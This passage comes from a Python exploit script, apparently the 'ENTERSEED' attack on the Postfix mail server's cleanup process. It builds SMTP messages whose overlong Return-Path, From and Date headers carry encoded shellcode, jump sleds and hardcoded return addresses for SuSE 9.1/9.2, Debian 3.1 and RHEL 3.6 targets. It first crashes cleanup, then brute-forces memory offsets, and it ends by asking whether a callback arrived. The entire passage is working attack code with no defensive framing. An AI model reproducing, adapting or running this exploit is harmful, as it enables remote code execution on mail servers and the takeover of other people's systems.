				print("Message %d, Header 0: length: %d" % (i,buffer_lengths[i][0]))
				message +='A'*buffer_lengths[i][0]
		
			message +=": This is the name<this@theaddress.net>\r\n"
			message +="From:"
			if(shellcode_at_msg == i and shellcode_at_hdr == 1):
	
				print("Message %d, Header 1: INSERTING SHELLCODE: total length: %d" % (i,buffer_lengths[i][1]))
				if (final_encoded_shellcode_length < max_shellcode_len):
					for jmps in range(0,(jmpSledSize)/3):
						message += "\xeb\x7f\x90"	
					message +='C' * (max_shellcode_len - final_encoded_shellcode_length - (jmpSledSize + postShellcodePad))
				else: 
					print "warning shellcode too long!"
	
				message +=shellcode_front
				message +=final_encoded_shellcode
				message += 'C' * postShellcodePad
				if(address_search==1):
					addresses = getNextAddress(addresses)
				message +=addresses
				message +='E' * (buffer_lengths[i][1]-shellcode_front_len-max_shellcode_len-addresses_len)
			else:
				print("Message %d, Header 1: length: %d" % (i,buffer_lengths[i][1]))
				message +='B'*buffer_lengths[i][1]
		
			message +=": This is the name<this@theaddress.net>\r\n"
			message +="Date:"
			if(shellcode_at_msg == i and shellcode_at_hdr == 2): 
				nop_sled_size = len(shellcode_front) + (max_shellcode_len - final_encoded_shellcode_length) + len("Date:")
				print("Message %d, Header 2: INSERTING SHELLCODE: total length: %d" % (i,buffer_lengths[i][2]))
				if (final_encoded_shellcode_length < max_shellcode_len):
					for jmps in range(0,(nop_sled_size-len("Date:")-135)/3):
						message += "\xeb\x7f\x90"	
					if((nop_sled_size-len("Date:")-135)%3 == 2):
						message += "\x90\x90"
					elif((nop_sled_size-len("Date:")-135)%3 == 1):
						message += "\x90"
					message +='C' * (max_shellcode_len - final_encoded_shellcode_length - (nop_sled_size-len("Date:")-135))
				else: 
					print "warning shellcode too long!"
				message +=shellcode_front
				message +=final_encoded_shellcode
				if(address_search==1):
					addresses = getNextAddress(addresses)
	
				message +=addresses
				message +='E' * (buffer_lengths[i][2]-shellcode_front_len-max_shellcode_len-addresses_len)
			else:
				print("Message %d, Header 2: length: %d" % (i,buffer_lengths[i][2]))
				message +='C'*buffer_lengths[i][2]
			
			message +=": This is the name<this@theaddress.net>\r\n"
			print "Sending message %d!" %i
			response =sendMsg2(target_ip, message,s)
			time.sleep(.5)
		
		data = "quit\r\n"
		s.send(data)
		data = s.recv(1024)
		s.close()
		if(address_search == 1):	
			time.sleep(loopSleep)
			continue
		else:
			break
### ENTERSEED Generation 2 ###
#for now, it works for SuSE 9.2
elif(gen2==1):	
	done = 0
	search_state = 0
	step1 = initial_step1
	step2 = initial_step2
	offset1 = initial_offset1
	offset2 = initial_offset2 
	while (not done):
		print "Timestamp " + time.strftime("%m/%d/%Y %H:%M:%S")
		print "Corruption Offset 1: %s" % offset1
		print "Corruption Offset 2: %s" % offset2
		#for some versions,
		#keep an open socket across the crash messages and the exploit messages.
		#for some reason, if we close the socket after the crash, cleanup starts
		#up again and screws up the heap.
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((target_ip, target_port))
			data = s.recv(1024)
			print "server: %s" % data
			if(nohelo == 0):
				data ="helo %s\r\n" % helo_hostname
				#print "client: %s" % data
				s.send(data)
				data = s.recv(1024)

			#crashCleanup loops through sending packets with long headers designed to crash 
			#the cleanup process. We know cleanup has crashed when we receive a '451 Error: 
			# queue file write error' - if we send the exploit immediately, it will attack
			#a pristine, unsuspecting heap. rock.
			message=""
			if(nocrash == 0):
				print "Attempting to crash cleanup process."
				crashCleanup3(target_ip,s)	
				print "Got crash! "

			if(justcrash == 1):
				print "Exiting..\n"
				sys.exit(0)
			
			print "A moment of silence for the process we just killed.\n"
			#this may need to be tuned for specific targets. The idea here is that you
			#want to give the process enough time to exit- otherwise it seems that 
			#postfix starts up cleanup differently and it screws up the stack.
			time.sleep(afterCrashSleep)

			print "Generating first message: "	
			if(target=="SUSE91"):
				message=""
				message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(671+step1),getRandAlphaNums(4),getRandAlphaNums(2),\
					getRandAlphaNums(3),getRandAlphaNums(4),getRandAlphaNums(4),getRandAlphaNums(10),getRandAlphaNums(3))
				message += "Date:%s\r\n" % (getRandAlphaNums(1071))
			if(target=="SUSE92"):
				message=""
				message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(671+step1),getRandAlphaNums(4),getRandAlphaNums(2),\
					getRandAlphaNums(3),getRandAlphaNums(4),getRandAlphaNums(4),getRandAlphaNums(10),getRandAlphaNums(3))
				message += "Date:%s\r\n" % (getRandAlphaNums(1071))
			elif (target=="DEBIAN31"):
				message=""
				message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(751),getRandAlphaNums(4),getRandAlphaNums(2),\
					getRandAlphaNums(3),getRandAlphaNums(4),getRandAlphaNums(4),getRandAlphaNums(10),getRandAlphaNums(3))
				message += "Date:%s\r\n" % (getRandAlphaNums(1886))
			elif (target=="RHEL3.6"):
				message=""
				#message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(791+offset1),getRandAlphaNums(4),getRandAlphaNums(2),\
				message += "Return-Path:%s: %s %s %s %s<%s@%s.%s>\r\n"	% (getRandAlphaNums(751+offset1),getRandAlphaNums(4),getRandAlphaNums(2),\
					getRandAlphaNums(3),getRandAlphaNums(4),getRandAlphaNums(4),getRandAlphaNums(10),getRandAlphaNums(3))
				message += "Date:%s\r\n" % (getRandAlphaNums(1886))

			response = sendMsg2(target_ip,message,s)
			if(response[0:3] != "250" and not bruteforce):
				print "Got unexpected crash. What did you do?"
				break
			time.sleep(.5)
			print "Generating second message: "	
			print "s1: %s s2: %s\n" % (step1, step2)
			
			if(target=="SUSE91"):
				message=""
				message += "Return-Path:%s<%s>\r\n" % (getRandAlphaNums(624+step2),getRandAlphaNums(19))
				part = "From:%s<%s>\r\n" % (getRandAlphaNums(final_encoded_shellcode_length*3) + '\x90' * (final_encoded_shellcode_length*2 - 43) + '\x01\x01\x01' + '\x90' * 35 + '\x83\xEF\xD6\x8B\xCF' + final_encoded_shellcode + getRandAlphaNums(3443-(final_encoded_shellcode_length*6))+'\x77\x1b\x76\x19'+ getRandAlphaNums(5)+'\xff\xff\xff'+ getRandAlphaNums(12)+ '\xE4\x55\x05\x08' + 'C' + '\x25\x01\x01\x01\x01\x25\x10\x10\x10\x10\x20\x43\x4f\x21\x43\x50\x50\x2c\x17\x08\x43\x4f\x58\x2d\x46\x0f\x01\x01\x05\x7f\x01\x01\x01\x09\x43\x50\x53\x58\x2d\x74\x0e\x01\x01\x05\x01\x01\x01\x01\x50\x59' + getRandAlphaNums(388) , getRandAlphaNums(19))
				message += part
				#print "%s\r\n" % part
			elif(target=="SUSE92"):
				message=""
				message += "Return-Path:%s<%s>\r\n" % (getRandAlphaNums(624+step2),getRandAlphaNums(19))
				part = "From:%s<%s>\r\n" % (getRandAlphaNums(final_encoded_shellcode_length*3) + '\x90' * (final_encoded_shellcode_length*2 - 43) + '\x01\x01\x01' + '\x90' * 35 + '\x83\xEF\xD6\x8B\xCF' + final_encoded_shellcode + getRandAlphaNums(3443-(final_encoded_shellcode_length*6))+'\x77\x1b\x76\x19'+ getRandAlphaNums(5)+'\xff\xff\xff'+ getRandAlphaNums(12)+ '\xB2\xE1\x04\x08' + 'C' + '\x25\x01\x01\x01\x01\x25\x10\x10\x10\x10\x20\x43\x4f\x21\x43\x50\x50\x2c\x17\x08\x43\x4f\x58\x2d\x46\x0f\x01\x01\x05\x7f\x01\x01\x01\x09\x43\x50\x53\x58\x2d\x74\x0e\x01\x01\x05\x01\x01\x01\x01\x50\x59' + getRandAlphaNums(388) , getRandAlphaNums(19))
				message += part
				#print "%s\r\n" % part
			elif(target=="DEBIAN31"):
				padding = "A" * (2389-final_encoded_shellcode_length-26)
				getstable =  '\x77\x1b\x76\x19'+getRandAlphaNums(5)+'\xff\xff\xff'+getRandAlphaNums(12)+ '\x93\x25\x01\x40' + getRandAlphaNums(1)
				shellcode_offset = - len(final_encoded_shellcode + padding) 
				fixecx= "\x81\xc1%c%c%c%c" % ( shellcode_offset & 0xff,\
								(shellcode_offset >> 8) & 0xff,\
								(shellcode_offset >> 16) & 0xff,\
								(shellcode_offset >> 24) & 0xff)
				jumpbacklen = shellcode_offset - len(fixecx + getstable)  - 5
				jumpback = "\xe8%c%c%c%c" % ( jumpbacklen & 0xff,\
								(jumpbacklen >> 8) & 0xff,\
								(jumpbacklen >> 16) & 0xff,\
								(jumpbacklen >> 24) & 0xff)
				message=""
				message += "Return-Path:%s<%s>\r\n"% (getRandAlphaNums(755),getRandAlphaNums(19))
				message += "Date:%s<%s>\r\n" % ( final_encoded_shellcode + padding + getstable + fixecx + jumpback + getRandAlphaNums(568+47) , getRandAlphaNums(19))
			elif(target=="RHEL3.6"):
				#padding = "A" * (2389-final_encoded_shellcode_length-26+300-36+offset2)
				#padding = "A" * (2389-final_encoded_shellcode_length-26+offset2-6)
				#getstable =  '\x77\x1b\x76\x19'+getRandAlphaNums(5)+'\xff\xff\xff'+getRandAlphaNums(12)+ '\xfc\x07\x06\x08' + getRandAlphaNums(1)
				getstable =  '\x77\x1b\x76\x19'+getRandAlphaNums(5)+'\xff\xff\xff'+getRandAlphaNums(12)+ '\xfc\x07\x06\xff' + getRandAlphaNums(1)
				padding = getstable * ((2389-final_encoded_shellcode_length-26+offset2-6)/len(getstable))
				padding = "A" * ((2389-final_encoded_shellcode_length-26+offset2-6) % len(getstable))+padding  
				shellcode_offset = - len(final_encoded_shellcode + padding) 
				fixecx= "\x81\xc1%c%c%c%c" % ( shellcode_offset & 0xff,\
								(shellcode_offset >> 8) & 0xff,\
								(shellcode_offset >> 16) & 0xff,\
								(shellcode_offset >> 24) & 0xff)
				jumpbacklen = shellcode_offset - len(fixecx + getstable)  - 5
				jumpback = "\xe8%c%c%c%c" % ( jumpbacklen & 0xff,\
								(jumpbacklen >> 8) & 0xff,\
								(jumpbacklen >> 16) & 0xff,\
								(jumpbacklen >> 24) & 0xff)
				message=""
				message += "Return-Path:%s<%s>\r\n"% (getRandAlphaNums(755),getRandAlphaNums(19))
				message += "Date:%s<%s>\r\n" % (fixecx + final_encoded_shellcode + padding + getstable +  jumpback , getRandAlphaNums(19))
			response = sendMsg2(target_ip, message,s)
			print "response: %s" % response
			if(bruteforce):
				if(response[0:3] == "250" ):
					if(extratrigger == 1):
						print "Cleanup did not crash - attempting extra trigger."
						nocrash = 1
						done = 0		
						extratrigger = 2
					else:
						print "Cleanup did not crash after exploit. Searching first offset" 
						if(extratrigger == 2):
							extratrigger = 1
						nocrash = 0
						if(fabs(offset1) >= max_offset1):
							step1 = -step1
							offset1 = initial_offset1 + step1
						else:
							offset1 = offset1 + step1
						if(search_state == 2):
							search_state = 0
							print "Resetting offset2" 
							offset2 = 0
							step2 = initial_step2
						elif(search_state == 1):
							search_state = 2
							step2 = -step2
							offset2 =initial_offset2 +  step2 
						if(randomoffset1):
							offset1 = g.randrange(-max_offset1,max_offset1)
				elif(response[0:3] != "250"):
					nocrash = 0
					if(holdoffset2):
						print "Holding offset2, searching first offset" 
						if(fabs(offset1) >= max_offset1+initial_offset1):
							step1 = -step1
							offset1 = initial_offset1 + step1
						else:
							offset1 = offset1 + step1
						if(randomoffset1):
							offset1 = g.randrange(-max_offset1,max_offset1)
					elif(response[0:3] == "ERR"):
						print "Got Error (ERR)! Searching first offset" 
						if(fabs(offset1) >= max_offset1+initial_offset1):
							step1 = -step1
							offset1 = initial_offset1 + step1
						else:
							offset1 = offset1 + step1
						if(randomoffset1):
							offset1 = g.randrange(-max_offset1,max_offset1)
					elif(response[0:3] == "451"):
						print "Got Error (451)! Searching second offset" 
						if(fabs(offset2) >= max_offset2+initial_offset2):
							if(search_state == 2):
								search_state = 0
								print "Stepping offset1 and resetting offset2" 
								offset1 = offset1 + step1
								offset2 = initial_offset2
							else:
								search_state = 2
								step2 = -step2
								offset2 = initial_offset2 + step2 
						else:
							search_state = 1
							offset2 = offset2 + step2
					s.close()
					time.sleep(afterCrashSleep)
				else:
					print "Something else happened." 
					sys.exit(1)
				time.sleep(1)
			else:	
				if(response[0:3] == "250"):
					if(extratrigger == 1):
						print "Cleanup did not crash - attempting extra trigger."
						nocrash = 1
						done = 0		
						extratrigger = 0
					else:
						print "Cleanup did not crash - something didn't work..."
						sys.exit(0)
				else:
					print "Looks good from here - did you get a callback?"
					done = 1
		except socket.error:
			print "Socket error in main loop"
			sys.exit(0)
	
